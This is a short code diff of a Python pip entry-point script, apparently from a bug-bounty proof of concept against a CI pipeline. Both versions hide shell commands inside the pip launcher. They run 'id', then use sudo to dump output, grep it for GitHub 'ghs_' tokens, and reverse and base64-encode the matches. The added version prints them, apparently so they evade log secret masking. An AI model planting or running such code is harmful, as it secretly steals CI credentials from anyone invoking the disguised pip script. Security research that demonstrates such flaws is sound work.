@@ -1,12 +1,12 @@
-#!/home/simon/Documents/Programming/bugbounty/actions/poc/bigquery/.venv/bin/python3.14
-import os
+#!/usr/bin/env python3
 import sys
 from pip._internal.cli.main import main
 import sys
 import subprocess
 
-subprocess.check_output("id", shell=True)
-subprocess.check_output("sudo python3 pip2.py | tr -d '\\0'  | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev | base64; sleep 500", shell=True)
+# print("test", file=sys.stderr)
+print(subprocess.check_output("id", shell=True))
+print(subprocess.check_output("sudo python3 .venv/bin/pip2.py | tr -d '\\0'  | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev | base64", shell=True))
 
 if __name__ == '__main__':
     if sys.argv[0].endswith('.exe'):
